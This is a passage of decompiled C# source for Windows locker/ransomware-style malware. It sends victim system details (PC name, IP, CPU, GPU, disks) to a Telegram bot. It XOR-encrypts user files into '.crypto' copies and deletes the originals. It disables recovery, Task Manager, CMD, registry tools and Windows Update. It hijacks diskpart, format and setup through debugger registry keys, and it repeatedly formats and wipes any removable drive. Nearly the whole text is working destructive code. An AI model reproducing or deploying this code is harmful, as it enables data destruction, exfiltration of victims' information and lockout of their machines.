					string text2 = "";
					try
					{
						ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT * FROM Win32_Processor").Get().GetEnumerator();
						try
						{
							if (enumerator.MoveNext())
							{
								text2 = Conversions.ToString(((ManagementBaseObject)(ManagementObject)enumerator.Current)["Name"]);
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
					}
					catch (Exception)
					{
						text2 = "Не удалось получить";
					}
					string text3 = "";
					try
					{
						ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController").Get().GetEnumerator();
						try
						{
							if (enumerator.MoveNext())
							{
								text3 = Conversions.ToString(((ManagementBaseObject)(ManagementObject)enumerator.Current)["Name"]);
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
					}
					catch (Exception)
					{
						text3 = "Не удалось получить";
					}
					string text4 = "";
					try
					{
						ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT * FROM Win32_LogicalDisk WHERE DriveType=3").Get().GetEnumerator();
						try
						{
							while (enumerator.MoveNext())
							{
								ManagementObject val = (ManagementObject)enumerator.Current;
								string text5 = Conversions.ToString(Math.Round((double)Conversions.ToLong(((ManagementBaseObject)val)["Size"]) / 1024.0 / 1024.0 / 1024.0, 2));
								string text6 = Conversions.ToString(Operators.ConcatenateObject((object)Conversions.ToString(Operators.ConcatenateObject((object)Conversions.ToString(Operators.ConcatenateObject((object)Conversions.ToString(((ManagementBaseObject)val)["DeviceID"]), (object)": ")), (object)text5)), (object)" GB; "));
								text4 = Conversions.ToString(Operators.ConcatenateObject((object)text4, (object)text6));
							}
						}
						finally
						{
							((IDisposable)enumerator)?.Dispose();
						}
					}
					catch (Exception)
					{
						text4 = "Не удалось получить";
					}
					string text7 = "Пользователь '" + name + "' открыл Locker\n\nИмя ПК: " + name + "\nАйпи: " + text + "\nПроцессор: " + text2;
					text7 = text7 + "\nВидеокарта: " + text3 + "\nХвид: " + text4;
					text7 = text7 + "\nДата запуска: " + DateAndTime.Now;
					string address = "https://api.telegram.org/bot" + string_7 + "/sendMessage";
					string text8 = "chat_id=" + string_8 + "&text=" + Uri.EscapeDataString(text7);
					try
					{
						using WebClient webClient2 = new WebClient();
						webClient2.Encoding = Encoding.UTF8;
						webClient2.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
						byte[] bytes = Encoding.UTF8.GetBytes(text8);
						webClient2.UploadData(address, "POST", bytes);
					}
					catch (Exception)
					{
						try
						{
							using WebClient webClient3 = new WebClient();
							webClient3.Encoding = Encoding.UTF8;
							webClient3.UploadString(address, text8);
						}
						catch (Exception)
						{
						}
					}
				}
				catch (Exception)
				{
				}
			});
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_8()
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = "reagentc",
				Arguments = "/disable",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			};
			try
			{
				Process.Start(startInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public void method_9()
	{
		try
		{
			RegistryKey currentUser = ((ServerComputer)Class1.Class0_0).Registry.CurrentUser;
			try
			{
				RegistryKey registryKey = currentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				if (registryKey == null)
				{
					registryKey = currentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				}
				registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
				registryKey.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				RegistryKey registryKey2 = currentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System", writable: true);
				if (registryKey2 == null)
				{
					registryKey2 = currentUser.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
				}
				registryKey2.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
				registryKey2.Close();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void method_10()
	{
		try
		{
			string[] array = new string[5]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
			};
			foreach (string text in array)
			{
				if (Directory.Exists(text))
				{
					method_11(text);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_11(string folderPath)
	{
		try
		{
			string[] files = Directory.GetFiles(folderPath, "*.*", SearchOption.TopDirectoryOnly);
			foreach (string text in files)
			{
				try
				{
					if (!text.EndsWith(".crypto") && !text.EndsWith(".exe") && !text.EndsWith(".dll") && !text.EndsWith(".sys") && new FileInfo(text).Length <= 104857600)
					{
						method_12(text);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				files = Directory.GetDirectories(folderPath);
				foreach (string text2 in files)
				{
					switch (Path.GetFileName(text2).ToLower())
					{
					case "windows":
					case "system32":
					case "syswow64":
						continue;
					}
					method_11(text2);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void method_12(string filePath)
	{
		try
		{
			byte[] data = File.ReadAllBytes(filePath);
			byte[] bytes = method_13(data);
			File.WriteAllBytes(filePath + ".crypto", bytes);
			File.Delete(filePath);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public byte[] method_13(byte[] data)
	{
		try
		{
			byte[] array = new byte[data.Length];
			int num = data.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = (byte)(data[i] ^ 0xAA);
			}
			return array;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return data;
		}
	}

	public void method_14()
	{
		try
		{
			string[] array = new string[5]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
				Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)
			};
			foreach (string text in array)
			{
				if (Directory.Exists(text))
				{
					method_15(text);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_15(string folderPath)
	{
		try
		{
			string[] files = Directory.GetFiles(folderPath, "*.crypto", SearchOption.TopDirectoryOnly);
			foreach (string text in files)
			{
				try
				{
					byte[] data = File.ReadAllBytes(text);
					byte[] bytes = method_13(data);
					File.WriteAllBytes(text.Replace(".crypto", ""), bytes);
					File.Delete(text);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			try
			{
				files = Directory.GetDirectories(folderPath);
				foreach (string text2 in files)
				{
					switch (Path.GetFileName(text2).ToLower())
					{
					case "windows":
					case "system32":
					case "syswow64":
						continue;
					}
					method_15(text2);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void method_16()
	{
		try
		{
			RegistryKey localMachine = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine;
			try
			{
				RegistryKey registryKey = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBSTOR", writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue("Start", 3, RegistryValueKind.DWord);
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USB", writable: true);
				if (registryKey2 != null)
				{
					registryKey2.SetValue("Start", 3, RegistryValueKind.DWord);
					registryKey2.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey3 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBHUB", writable: true);
				if (registryKey3 != null)
				{
					registryKey3.SetValue("Start", 3, RegistryValueKind.DWord);
					registryKey3.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey4 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBHUB3", writable: true);
				if (registryKey4 != null)
				{
					registryKey4.SetValue("Start", 3, RegistryValueKind.DWord);
					registryKey4.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey5 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\USBCCGP", writable: true);
				if (registryKey5 != null)
				{
					registryKey5.SetValue("Start", 3, RegistryValueKind.DWord);
					registryKey5.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey6 = localMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\RemovableStorageDevices", writable: true);
				if (registryKey6 != null)
				{
					try
					{
						registryKey6.DeleteValue("Deny_All");
					}
					catch
					{
					}
					registryKey6.Close();
				}
			}
			catch
			{
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_17()
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = "reagentc",
				Arguments = "/enable",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			};
			try
			{
				Process.Start(startInfo);
			}
			catch
			{
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_18()
	{
		try
		{
			RegistryKey currentUser = ((ServerComputer)Class1.Class0_0).Registry.CurrentUser;
			try
			{
				RegistryKey registryKey = currentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
				if (registryKey != null)
				{
					try
					{
						registryKey.DeleteValue("DisableTaskMgr");
					}
					catch
					{
					}
					try
					{
						registryKey.DeleteValue("DisableRegistryTools");
					}
					catch
					{
					}
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = currentUser.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\System", writable: true);
				if (registryKey2 != null)
				{
					try
					{
						registryKey2.DeleteValue("DisableCMD");
					}
					catch
					{
					}
					registryKey2.Close();
				}
			}
			catch
			{
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_19()
	{
		try
		{
			RegistryKey localMachine = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine;
			try
			{
				RegistryKey registryKey = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Class\\{36FC9E60-C465-11CF-8056-444553540000}", writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue("LowerFilters", new string[1] { "" }, RegistryValueKind.MultiString);
					registryKey.SetValue("UpperFilters", new string[1] { "" }, RegistryValueKind.MultiString);
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", writable: true);
				if (registryKey2 != null)
				{
					registryKey2.SetValue("UEFISecureBootEnabled", 1, RegistryValueKind.DWord);
					registryKey2.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey3 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\BootOrderList", writable: true);
				if (registryKey3 == null)
				{
					registryKey3 = localMachine.CreateSubKey("SYSTEM\\CurrentControlSet\\Control\\BootOrderList");
				}
				registryKey3.SetValue("DisableUSBBoot", 1, RegistryValueKind.DWord);
				registryKey3.SetValue("DisableCDBoot", 1, RegistryValueKind.DWord);
				registryKey3.SetValue("DisableNetworkBoot", 1, RegistryValueKind.DWord);
				registryKey3.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey4 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup", writable: true);
				if (registryKey4 != null)
				{
					registryKey4.SetValue("CmdLine", "", RegistryValueKind.String);
					registryKey4.SetValue("SetupType", 0, RegistryValueKind.DWord);
					registryKey4.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey5 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\setup.exe", writable: true);
				if (registryKey5 == null)
				{
					registryKey5 = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\setup.exe");
				}
				registryKey5.SetValue("Debugger", "\"" + Application.ExecutablePath + "\"", RegistryValueKind.String);
				registryKey5.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey6 = localMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", writable: true);
				if (registryKey6 == null)
				{
					registryKey6 = localMachine.CreateSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU");
				}
				registryKey6.SetValue("NoAutoUpdate", 1, RegistryValueKind.DWord);
				registryKey6.SetValue("AUOptions", 1, RegistryValueKind.DWord);
				registryKey6.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey7 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\diskpart.exe", writable: true);
				if (registryKey7 == null)
				{
					registryKey7 = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\diskpart.exe");
				}
				registryKey7.SetValue("Debugger", "\"" + Application.ExecutablePath + "\"", RegistryValueKind.String);
				registryKey7.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey8 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\format.com", writable: true);
				if (registryKey8 == null)
				{
					registryKey8 = localMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\format.com");
				}
				registryKey8.SetValue("Debugger", "\"" + Application.ExecutablePath + "\"", RegistryValueKind.String);
				registryKey8.Close();
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey9 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\msiserver", writable: true);
				if (registryKey9 != null)
				{
					registryKey9.SetValue("Start", 4, RegistryValueKind.DWord);
					registryKey9.Close();
				}
			}
			catch
			{
			}
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "bcdedit",
					Arguments = "/set {bootmgr} displaybootmenu no",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				});
			}
			catch
			{
			}
			Thread thread = new Thread((ThreadStart)delegate
			{
				method_20();
			});
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_20()
	{
		try
		{
			while (true)
			{
				try
				{
					DriveInfo[] drives = DriveInfo.GetDrives();
					foreach (DriveInfo driveInfo in drives)
					{
						try
						{
							if (driveInfo.DriveType != DriveType.Removable || !driveInfo.IsReady)
							{
								continue;
							}
							string text = driveInfo.Name.Substring(0, 2);
							try
							{
								Process.Start(new ProcessStartInfo
								{
									FileName = "cmd.exe",
									Arguments = "/c echo Y | format " + text + " /FS:NTFS /Q /X /V:LOCKED",
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true,
									UseShellExecute = false,
									RedirectStandardOutput = true,
									RedirectStandardError = true
								}).WaitForExit(5000);
							}
							catch
							{
							}
							try
							{
								if (Directory.Exists(text + "\\"))
								{
									string[] files = Directory.GetFiles(text + "\\", "*.*", SearchOption.AllDirectories);
									foreach (string path in files)
									{
										try
										{
											File.SetAttributes(path, FileAttributes.Normal);
											File.Delete(path);
										}
										catch
										{
										}
									}
									files = Directory.GetDirectories(text + "\\", "*", SearchOption.AllDirectories);
									foreach (string path2 in files)
									{
										try
										{
											Directory.Delete(path2, recursive: true);
										}
										catch
										{
										}
									}
								}
							}
							catch
							{
							}
							try
							{
								string contents = "select volume " + text + "\r\noffline volume\r\nexit";
								string text2 = Path.Combine(Path.GetTempPath(), "dp_" + Guid.NewGuid().ToString() + ".txt");
								File.WriteAllText(text2, contents);
								Process.Start(new ProcessStartInfo
								{
									FileName = "diskpart",
									Arguments = "/s \"" + text2 + "\"",
									WindowStyle = ProcessWindowStyle.Hidden,
									CreateNoWindow = true,
									UseShellExecute = false
								}).WaitForExit(3000);
								try
								{
									File.Delete(text2);
								}
								catch
								{
								}
							}
							catch
							{
							}
							try
							{
								RegistryKey registryKey = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine.OpenSubKey("SYSTEM\\MountedDevices", writable: true);
								if (registryKey == null)
								{
									continue;
								}
								string[] files = registryKey.GetValueNames();
								foreach (string text3 in files)
								{
									if (text3.Contains(text))
									{
										try
										{
											registryKey.DeleteValue(text3);
										}
										catch
										{
										}
									}
								}
								registryKey.Close();
							}
							catch
							{
							}
						}
						catch
						{
						}
					}
					Thread.Sleep(2000);
				}
				catch
				{
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_21()
	{
		try
		{
			RegistryKey localMachine = ((ServerComputer)Class1.Class0_0).Registry.LocalMachine;
			try
			{
				RegistryKey registryKey = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\Class\\{36FC9E60-C465-11CF-8056-444553540000}", writable: true);
				if (registryKey != null)
				{
					try
					{
						registryKey.DeleteValue("LowerFilters");
					}
					catch
					{
					}
					try
					{
						registryKey.DeleteValue("UpperFilters");
					}
					catch
					{
					}
					registryKey.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\BootOrderList", writable: true);
				if (registryKey2 != null)
				{
					try
					{
						registryKey2.DeleteValue("DisableUSBBoot");
					}
					catch
					{
					}
					try
					{
						registryKey2.DeleteValue("DisableCDBoot");
					}
					catch
					{
					}
					try
					{
						registryKey2.DeleteValue("DisableNetworkBoot");
					}
					catch
					{
					}
					registryKey2.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey3 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup", writable: true);
				if (registryKey3 != null)
				{
					try
					{
						registryKey3.DeleteValue("CmdLine");
					}
					catch
					{
					}
					try
					{
						registryKey3.DeleteValue("SetupType");
					}
					catch
					{
					}
					registryKey3.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey4 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", writable: true);
				if (registryKey4 != null)
				{
					try
					{
						registryKey4.DeleteSubKeyTree("setup.exe");
					}
					catch
					{
					}
					registryKey4.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey5 = localMachine.OpenSubKey("SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", writable: true);
				if (registryKey5 != null)
				{
					try
					{
						registryKey5.DeleteValue("NoAutoUpdate");
					}
					catch
					{
					}
					try
					{
						registryKey5.DeleteValue("AUOptions");
					}
					catch
					{
					}
					registryKey5.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey6 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", writable: true);
				if (registryKey6 != null)
				{
					try
					{
						registryKey6.DeleteSubKeyTree("diskpart.exe");
					}
					catch
					{
					}
					registryKey6.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey7 = localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", writable: true);
				if (registryKey7 != null)
				{
					try
					{
						registryKey7.DeleteSubKeyTree("format.com");
					}
					catch
					{
					}
					registryKey7.Close();
				}
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey8 = localMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\Services\\msiserver", writable: true);
				if (registryKey8 != null)
				{
					registryKey8.SetValue("Start", 3, RegistryValueKind.DWord);
					registryKey8.Close();
				}
			}
			catch
			{
			}
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "bcdedit",
					Arguments = "/set {bootmgr} displaybootmenu yes",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				});
			}
			catch
			{
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
